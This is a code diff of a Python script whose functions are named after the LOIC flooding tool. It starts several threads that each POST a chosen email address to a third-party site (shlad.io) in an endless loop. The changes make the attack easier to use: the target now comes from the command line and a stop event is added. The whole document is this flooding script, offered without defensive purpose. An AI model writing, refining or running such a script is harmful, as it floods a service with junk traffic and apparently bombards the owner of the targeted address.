@@ -1,24 +1,40 @@
 import requests
+import sys
 import threading
 
-def auto_shlad(target):
-    print("init auto_shlad: %s" % target)
-
+def auto_shlad(target, should_stop):
     data = {
         'email': target,
         'origin':'djankgo'
     }
 
-    while True:
+    while not should_stop.is_set():
         requests.post('http://www.shlad.io/', data)
 
-def loic_shlad(threads, target):
-    while threads > 0:
+def loic_shlad(n, target):
+    print("init loic_shlad: %d %s" % (n, target))
+
+    should_stop = threading.Event()
+
+    for _ in range(n):
         threading.Thread(
             target=auto_shlad,
-            args=[target],
+            args=[target, should_stop],
         ).start()
-        threads -= 1
+
+    return should_stop
 
 if __name__ == "__main__":
-    loic_shlad(4, 'shl@d')
+    target = 'shl@d'
+
+    if len(sys.argv) > 1:
+        target = sys.argv[1]
+
+    should_stop = loic_shlad(4, target)
+
+    try:
+        while True:
+            pass
+    except KeyboardInterrupt:
+        should_stop.set()
+
